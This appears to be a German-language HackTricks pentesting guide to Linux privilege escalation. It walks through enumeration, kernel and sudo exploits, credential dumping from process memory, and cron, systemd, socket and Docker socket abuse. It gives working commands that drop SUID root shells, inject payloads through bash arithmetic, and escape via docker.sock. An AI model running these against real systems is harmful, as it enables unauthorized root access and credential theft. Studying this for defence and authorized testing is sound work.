# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Systeminformationen

### OS-Informationen

Beginnen wir damit, Informationen über das laufende OS zu sammeln
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Pfad

Wenn du **Schreibrechte für einen beliebigen Ordner innerhalb der `PATH`-Variable** hast, kannst du möglicherweise einige Bibliotheken oder Binaries hijacken:
```bash
echo $PATH
```
### Env info

Interessante Informationen, Passwörter oder API keys in den Umgebungsvariablen?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Prüfe die Kernel-Version und ob es einen exploit gibt, der verwendet werden kann, um escalate privileges durchzuführen.
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Du kannst eine gute Liste verwundbarer Kernel und einige bereits **compiled exploits** hier finden: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) und [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Weitere Seiten, auf denen du einige **compiled exploits** finden kannst: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Um alle verwundbaren Kernel-Versionen von dieser Seite zu extrahieren, kannst du Folgendes tun:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Tools, die bei der Suche nach kernel exploits helfen können, sind:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (auf dem Ziel ausführen, prüft nur exploits für kernel 2.x)

Suche immer **die kernel version in Google**, vielleicht ist deine kernel version in einem kernel exploit erwähnt und dann kannst du sicher sein, dass dieser exploit gültig ist.

Weitere kernel exploitation techniques:

{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo-Version

Basierend auf den anfälligen sudo-Versionen, die in erscheinen:
```bash
searchsploit sudo
```
Du kannst prüfen, ob die sudo-Version verwundbar ist, indem du dieses grep verwendest.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

Sudo-Versionen vor 1.9.17p1 (**1.9.14 - 1.9.17 < 1.9.17p1**) erlauben nicht-privilegierten lokalen Benutzern, ihre Rechte zu root über die sudo `--chroot` Option zu eskalieren, wenn die Datei `/etc/nsswitch.conf` aus einem vom Benutzer kontrollierten Verzeichnis verwendet wird.

Hier ist ein [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) zur Ausnutzung dieser [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463). Bevor du den exploit ausführst, stelle sicher, dass deine `sudo`-Version verwundbar ist und die `chroot`-Funktion unterstützt.

Für weitere Informationen siehe das ursprüngliche [vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)

#### sudo < v1.8.28

Von @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg Signaturprüfung fehlgeschlagen

Sieh dir **smasher2 box of HTB** für ein **Beispiel** an, wie diese vuln ausgenutzt werden könnte.
```bash
dmesg 2>/dev/null | grep "signature"
```
### Weitere system enumeration
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Mögliche Abwehrmaßnahmen auflisten

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

Wenn Sie sich in einem docker container befinden, können Sie versuchen, daraus zu entkommen:


{{#ref}}
docker-security/
{{#endref}}

## Laufwerke

Überprüfen Sie **was gemountet und nicht gemountet ist**, wo und warum. Wenn etwas nicht gemountet ist, können Sie versuchen, es zu mounten und nach privaten Informationen zu suchen.
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Nützliche Software

Nützliche binaries aufzählen
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Überprüfe auch, ob **ein Compiler installiert ist**. Das ist nützlich, wenn du einen kernel exploit verwenden musst, da empfohlen wird, ihn auf der Maschine zu kompilieren, auf der du ihn einsetzen wirst (oder auf einer ähnlichen).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Verwundbare Software installiert

Überprüfe die **Version der installierten Pakete und Dienste**. Möglicherweise gibt es eine alte Nagios-Version (zum Beispiel), die für escalating privileges ausgenutzt werden könnte…\
Es wird empfohlen, die Version der verdächtigen installierten Software manuell zu prüfen.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
If you have SSH access to the machine you could also use **openVAS** to check for outdated and vulnerable software installed inside the machine.

> [!NOTE] > _Beachte, dass diese Befehle viele Informationen anzeigen, die größtenteils nutzlos sind, daher werden Anwendungen wie OpenVAS oder ähnliche empfohlen, die prüfen, ob eine installierte Softwareversion gegenüber bekannten exploits verwundbar ist_

## Prozesse

Schau dir an, **welche Prozesse** ausgeführt werden, und prüfe, ob ein Prozess **mehr Privilegien hat, als er sollte** (vielleicht läuft ein tomcat als root?)
```bash
ps aux
ps -ef
top -n 1
```
Überprüfe immer, ob mögliche [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md). **Linpeas** erkennt diese, indem es den `--inspect`-Parameter in der Befehlszeile des Prozesses überprüft.\
Prüfe außerdem deine Berechtigungen für die Binaries der Prozesse — vielleicht kannst du eine überschreiben.

### Prozessüberwachung

Du kannst Tools wie [**pspy**](https://github.com/DominicBreuker/pspy) verwenden, um Prozesse zu überwachen. Das kann sehr nützlich sein, um verwundbare Prozesse zu identifizieren, die häufig ausgeführt werden oder wenn bestimmte Voraussetzungen erfüllt sind.

### Prozessspeicher

Einige Dienste eines Servers speichern **credentials in clear text inside the memory**.\
Normalerweise wirst du **root privileges** benötigen, um den Speicher von Prozessen zu lesen, die anderen Benutzern gehören; daher ist das in der Regel nützlicher, wenn du bereits root bist und weitere credentials entdecken möchtest.\
Denke jedoch daran, dass **as a regular user you can read the memory of the processes you own**.

> [!WARNING]
> Beachte, dass heutzutage die meisten Systeme **ptrace standardmäßig nicht erlauben**, was bedeutet, dass du keine anderen Prozesse deines unprivilegierten Benutzers dumpen kannst.
>
> Die Datei _**/proc/sys/kernel/yama/ptrace_scope**_ steuert die Zugänglichkeit von ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: alle Prozesse können debuggt werden, solange sie die gleiche uid haben. Dies ist die klassische Funktionsweise von ptrace.
> - **kernel.yama.ptrace_scope = 1**: nur ein Elternprozess kann debuggt werden.
> - **kernel.yama.ptrace_scope = 2**: Nur admin kann ptrace verwenden, da dafür die CAP_SYS_PTRACE capability erforderlich ist.
> - **kernel.yama.ptrace_scope = 3**: Keine Prozesse dürfen mit ptrace nachverfolgt werden. Sobald gesetzt, ist ein Reboot nötig, um ptrace wieder zu aktivieren.

#### GDB

Wenn du Zugriff auf den Speicher eines FTP-Services (zum Beispiel) hast, könntest du den Heap auslesen und darin nach credentials suchen.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB-Skript
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Für eine gegebene Prozess-ID zeigen **maps, wie Speicher innerhalb des virtuellen Adressraums dieses Prozesses abgebildet ist**; sie zeigt auch die **Zugriffsrechte jeder abgebildeten Region**. Die Pseudo-Datei **mem** **legt den Speicher des Prozesses selbst offen**. Aus der **maps**-Datei wissen wir, welche **Speicherbereiche lesbar sind** und deren Offsets. Wir nutzen diese Informationen, um **in die mem-Datei zu seeken und alle lesbaren Bereiche in eine Datei zu dumpen**.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` bietet Zugriff auf den **physischen** Speicher des Systems, nicht auf den virtuellen Speicher. Auf den virtuellen Adressraum des Kernels kann mit /dev/kmem zugegriffen werden.\
Typischerweise ist `/dev/mem` nur von **root** und der **kmem**-Gruppe lesbar.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump for linux

ProcDump ist eine für Linux neu gedachte Version des klassischen ProcDump-Tools aus der Sysinternals-Tool-Suite für Windows. Erhältlich unter [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Werkzeuge

Um den Speicher eines Prozesses zu dumpen, können Sie Folgendes verwenden:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Sie können manuell die root-Anforderungen entfernen und den Prozess dumpen, der Ihnen gehört
- Script A.5 aus [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root wird benötigt)

### Anmeldedaten aus dem Prozessspeicher

#### Manuelles Beispiel

Wenn Sie feststellen, dass der authenticator-Prozess läuft:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Du kannst den Prozess dumpen (siehe vorherige Abschnitte, um verschiedene Wege zu finden, den Speicher eines Prozesses zu dumpen) und im Speicher nach credentials suchen:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Das Tool [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) wird **Klartext-Anmeldedaten aus dem Speicher** und aus einigen **bekannten Dateien** stehlen. Es benötigt root-Privilegien, um ordnungsgemäß zu funktionieren.

| Funktion                                          | Prozessname          |
| ------------------------------------------------- | -------------------- |
| GDM password (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### Search Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Geplante/Cron-Jobs

### Crontab UI (alseambusher) läuft als root – webbasiertes scheduler privesc

Wenn ein Web-„Crontab UI“-Panel (alseambusher/crontab-ui) als root läuft und nur an Loopback gebunden ist, kannst du es trotzdem über SSH-Local-Port-Forwarding erreichen und einen privilegierten Job erstellen, um Privilegien zu eskalieren.

Typische Kette
- Entdecke nur-Loopback-gebundenen Port (z. B. 127.0.0.1:8000) und Basic-Auth-Realm via `ss -ntlp` / `curl -v localhost:8000`
- Finde Zugangsdaten in operativen Artefakten:
- Backups/Skripte mit `zip -P <password>`
- systemd-Unit, die `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."` enthält
- Tunnel aufbauen und einloggen:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Erstelle einen high-priv job und führe ihn sofort aus (drops SUID shell):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Verwenden Sie es:
```bash
/tmp/rootshell -p   # root shell
```
Härtung
- Führen Sie Crontab UI nicht als root aus; beschränken Sie es auf einen dedizierten Benutzer mit minimalen Berechtigungen
- An localhost binden und zusätzlich den Zugriff über firewall/VPN einschränken; Passwörter nicht wiederverwenden
- Vermeiden Sie das Einbetten von secrets in unit files; verwenden Sie secret stores oder eine root-only EnvironmentFile
- Aktivieren Sie audit/logging für on-demand job executions

Prüfen Sie, ob ein geplanter Job verwundbar ist. Vielleicht können Sie ausnutzen, dass ein script von root ausgeführt wird (wildcard vuln? can modify files that root uses? use symlinks? create specific files in the directory that root uses?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron path

Zum Beispiel findest du in _/etc/crontab_ den PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Beachte, dass der Benutzer "user" Schreibrechte über /home/user hat_)

Wenn in dieser crontab der root user versucht, einen Befehl oder ein Skript auszuführen, ohne den PATH zu setzen. Zum Beispiel: _\* \* \* \* root overwrite.sh_\
Dann kannst du eine root shell erhalten, indem du Folgendes verwendest:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron using a script with a wildcard (Wildcard Injection)

Wenn ein script, das von root ausgeführt wird, ein “**\***” in einem Befehl enthält, kannst du dies ausnutzen, um unerwartete Dinge (wie privesc) zu bewirken. Beispiel:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Wenn das Wildcard einem Pfad wie** _**/some/path/\***_ **vorausgeht, ist es nicht verwundbar (selbst** _**./\***_ **nicht).**

Read the following page for more wildcard exploitation tricks:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash führt parameter expansion und command substitution vor der arithmetischen Auswertung in ((...)), $((...)) und let durch. Wenn ein als root laufender cron/parser untrusted Log-Felder liest und diese in einen arithmetischen Kontext einspeist, kann ein Angreifer eine command substitution $(...) injizieren, die beim Ausführen des cron als root ausgeführt wird.

- Warum es funktioniert: In Bash erfolgen expansions in dieser Reihenfolge: parameter/variable expansion, command substitution, arithmetic expansion, dann word splitting und pathname expansion. Ein Wert wie `$(/bin/bash -c 'id > /tmp/pwn')0` wird zuerst substituiert (der Befehl wird ausgeführt), danach wird die verbleibende Zahl `0` für die Arithmetik verwendet, sodass das Script ohne Fehler weiterläuft.

- Typisches verwundbares Muster:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Ausnutzung: Sorge dafür, dass attacker-controlled Text in das geparste Log geschrieben wird, sodass das zahlenähnliche Feld eine command substitution enthält und mit einer Ziffer endet. Stelle sicher, dass dein Befehl nichts auf stdout ausgibt (oder leite es um), damit die Arithmetik gültig bleibt.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

Wenn du **ein cron script modifizieren kannst**, das als root ausgeführt wird, kannst du sehr einfach eine Shell bekommen:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Wenn das von root ausgeführte script ein **Verzeichnis, auf das du vollen Zugriff hast**, verwendet, kann es sinnvoll sein, dieses Verzeichnis zu löschen und **einen symlink folder auf ein anderes anzulegen**, der ein von dir kontrolliertes script bereitstellt.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Custom-signed cron binaries with writable payloads
Blue teams signieren manchmal cron-getriebene binaries, indem sie einen benutzerdefinierten ELF-Abschnitt dumpen und nach einem Vendor-String greppen, bevor sie diese als root ausführen. Wenn dieses Binary group-writable ist (z. B. `/opt/AV/periodic-checks/monitor` im Besitz von `root:devs 770`) und du das signing material leak kannst, kannst du den Abschnitt fälschen und die cron task kapern:

1. Verwende `pspy`, um den Verifikationsablauf zu erfassen. In Era führte root `objcopy --dump-section .text_sig=text_sig_section.bin monitor` aus, gefolgt von `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin` und führte dann die Datei aus.
2. Recreate das erwartete Zertifikat mithilfe des leaked key/config (aus `signing.zip`):
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. Build einen bösartigen Ersatz (z. B. eine SUID bash dropen, deinen SSH key hinzufügen) und bette das Zertifikat in `.text_sig` ein, sodass das grep passiert:
```bash
gcc -fPIC -pie monitor.c -o monitor
objcopy --add-section .text_sig=cert.pem monitor
objcopy --dump-section .text_sig=text_sig_section.bin monitor
strings text_sig_section.bin | grep 'Era Inc.'
```
4. Überschreibe das geplante Binary und erhalte dabei die execute bits:
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. Warte auf den nächsten cron run; sobald die naive Signaturprüfung besteht, läuft dein payload als root.

### Frequent cron jobs

Du kannst die Prozesse überwachen, um nach Prozessen zu suchen, die alle 1, 2 oder 5 Minuten ausgeführt werden. Vielleicht kannst du das ausnutzen und Privilegien eskalieren.

For example, to **monitor every 0.1s during 1 minute**, **sort by less executed commands** and delete the commands that have been executed the most, you can do:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Du kannst auch** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (dies wird jeden gestarteten Prozess überwachen und auflisten).

### Unsichtbare cron jobs

Es ist möglich, einen cronjob zu erstellen, indem man **einen carriage return nach einem Kommentar setzt** (ohne newline character), und der cron job wird funktionieren. Beispiel (beachte das carriage return char):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Dienste

### Beschreibbare _.service_ Dateien

Prüfe, ob du irgendeine `.service`-Datei schreiben kannst. Wenn ja, **könntest du sie ändern**, sodass sie **deine backdoor ausführt**, wenn der Dienst **gestartet**, **neugestartet** oder **gestoppt** wird (vielleicht musst du bis zum nächsten Reboot warten).\
Zum Beispiel erstelle deine backdoor innerhalb der .service-Datei mit **`ExecStart=/tmp/script.sh`**

### Beschreibbare Service-Binaries

Beachte, dass du, falls du **Schreibrechte auf Binärdateien hast, die von Diensten ausgeführt werden**, diese verändern kannst, um backdoors zu platzieren, sodass beim erneuten Ausführen der Dienste die backdoors ausgeführt werden.

### systemd PATH - Relative Pfade

Du kannst den von **systemd** verwendeten PATH mit:
```bash
systemctl show-environment
```
Wenn du feststellst, dass du in einem der Ordner des Pfads **schreiben** kannst, könntest du möglicherweise **Privilegien eskalieren**. Du musst nach **relativen Pfaden, die in Service-Konfigurationsdateien verwendet werden**, suchen, wie:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Erstelle dann eine **ausführbare Datei** mit dem **gleichen Namen wie das relative Pfad-Binary** im systemd PATH-Ordner, in den du schreiben kannst, und wenn der Service aufgefordert wird, die verwundbare Aktion (**Start**, **Stop**, **Reload**) auszuführen, wird deine **Backdoor** ausgeführt (nicht-privilegierte Benutzer können Services normalerweise nicht starten/stoppen, prüfe aber, ob du `sudo -l` verwenden kannst).

**Mehr über Dienste erfährst du mit `man systemd.service`.**

## **Timer**

**Timer** sind systemd unit files, deren Name auf `**.timer**` endet und die `**.service**`-Dateien oder Events steuern. **Timer** können als Alternative zu cron verwendet werden, da sie eingebaute Unterstützung für calendar time events und monotonic time events bieten und asynchron ausgeführt werden können.

Du kannst alle Timer mit folgendem Befehl auflisten:
```bash
systemctl list-timers --all
```
### Schreibbare Timer

Wenn du einen Timer modifizieren kannst, kannst du ihn dazu bringen, vorhandene systemd.unit-Einheiten (wie eine `.service` oder eine `.target`) auszuführen.
```bash
Unit=backdoor.service
```
In der Dokumentation steht, was die Unit ist:

> Die Unit, die aktiviert wird, wenn dieser Timer abläuft. Das Argument ist ein Unit-Name, dessen Suffix nicht ".timer" ist. Falls nicht angegeben, fällt dieser Wert standardmäßig auf einen Service zurück, der denselben Namen hat wie die Timer-Unit, mit Ausnahme des Suffixes. (Siehe oben.) Es wird empfohlen, dass der zu aktivierende Unit-Name und der Unit-Name der Timer-Unit identisch benannt sind, mit Ausnahme des Suffixes.

Daher müsstest du, um diese Berechtigung auszunutzen:

- Finde eine systemd Unit (z. B. eine `.service`), die eine **beschreibbare Binärdatei ausführt**
- Finde eine systemd Unit, die einen **relativen Pfad ausführt** und bei der du **Schreibrechte** auf den **systemd PATH** hast (um dieses ausführbare Programm zu imitieren)

**Erfahre mehr über Timer mit `man systemd.timer`.**

### **Timer aktivieren**

Um einen Timer zu aktivieren, benötigst du root-Rechte und musst folgendes ausführen:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Beachte, dass der **timer** durch Erstellen eines Symlinks darauf unter `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer` **aktiviert** wird

## Sockets

Unix Domain Sockets (UDS) ermöglichen die **Prozesskommunikation** auf derselben oder auf unterschiedlichen Maschinen innerhalb von client-server-Modellen. Sie verwenden Standard-Unix-Dateideskriptoren für die Kommunikation zwischen Rechnern und werden über `.socket`-Dateien eingerichtet.

Sockets können mittels `.socket`-Dateien konfiguriert werden.

**Erfahre mehr über sockets mit `man systemd.socket`.** In dieser Datei können mehrere interessante Parameter konfiguriert werden:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Diese Optionen unterscheiden sich, geben aber zusammengefasst an, **wo der Socket lauschen wird** (der Pfad der AF_UNIX-Socket-Datei, die IPv4/6-Adresse und/oder die Portnummer, auf die gehört werden soll, etc.)
- `Accept`: Nimmt ein boolean-Argument. Wenn **true**, wird für jede eingehende Verbindung eine **Service-Instanz gestartet** und nur der Verbindungs-Socket an diese übergeben. Wenn **false**, werden alle listening Sockets selbst **an die gestartete service unit übergeben**, und es wird nur eine Service-Unit für alle Verbindungen gestartet. Dieser Wert wird für Datagram-Sockets und FIFOs ignoriert, bei denen eine einzelne Service-Unit bedingungslos allen eingehenden Traffic verarbeitet. **Defaults to false**. Aus Leistungsgründen wird empfohlen, neue Daemons so zu schreiben, dass sie für `Accept=no` geeignet sind.
- `ExecStartPre`, `ExecStartPost`: Nimmt eine oder mehrere Kommandozeilen entgegen, die jeweils **vor** bzw. **nach** dem Erstellen und Binden der listening **sockets**/FIFOs **ausgeführt** werden. Das erste Token der Kommandozeile muss ein absoluter Dateiname sein, gefolgt von Argumenten für den Prozess.
- `ExecStopPre`, `ExecStopPost`: Zusätzliche **Befehle**, die **vor** bzw. **nach** dem Schließen und Entfernen der listening **sockets**/FIFOs **ausgeführt** werden.
- `Service`: Gibt den Namen der **service**-Unit an, die bei **eingehendem Traffic** **aktiviert** werden soll. Diese Einstellung ist nur für sockets mit Accept=no erlaubt. Sie ist standardmäßig die Service-Unit mit demselben Namen wie der Socket (mit verändertem Suffix). In den meisten Fällen sollte die Verwendung dieser Option nicht notwendig sein.

### Writable .socket files

Wenn du eine **beschreibbare** `.socket`-Datei findest, kannst du am Anfang der `[Socket]`-Sektion etwas wie: `ExecStartPre=/home/kali/sys/backdoor` hinzufügen und die Backdoor wird vor dem Erstellen des Sockets ausgeführt. Daher wirst du **wahrscheinlich warten müssen, bis die Maschine neu gestartet wird.**\
_Note that the system must be using that socket file configuration or the backdoor won't be executed_

### Writable sockets

Wenn du einen **beschreibbaren socket** identifizierst (_hier sprechen wir jetzt über Unix Sockets und nicht über die Konfig-`.socket`-Dateien_), dann **kannst du mit diesem Socket kommunizieren** und möglicherweise eine Schwachstelle ausnutzen.

### Unix Sockets auflisten
```bash
netstat -a -p --unix
```
### Rohverbindung
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exploitation-Beispiel:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

Beachte, dass es möglicherweise einige **sockets gibt, die auf HTTP-Anfragen hören** (_ich spreche nicht von .socket files, sondern von Dateien, die als unix sockets fungieren_). Du kannst das mit folgendem Befehl prüfen:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
Wenn der Socket **auf eine HTTP-Anfrage antwortet**, dann kannst du **mit ihm kommunizieren** und möglicherweise **eine Schwachstelle ausnutzen**.

### Beschreibbarer Docker Socket

Der Docker-Socket, oft zu finden unter `/var/run/docker.sock`, ist eine kritische Datei, die abgesichert werden sollte. Standardmäßig ist er für den `root`-Benutzer und Mitglieder der `docker`-Gruppe beschreibbar. Schreibzugriff auf diesen Socket kann zu Privilege Escalation führen. Hier ist eine Aufschlüsselung, wie das durchgeführt werden kann und alternative Methoden, falls die Docker CLI nicht verfügbar ist.

#### **Privilege Escalation with Docker CLI**

Wenn du Schreibzugriff auf den Docker-Socket hast, kannst du Privilege Escalation mit den folgenden Befehlen durchführen:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
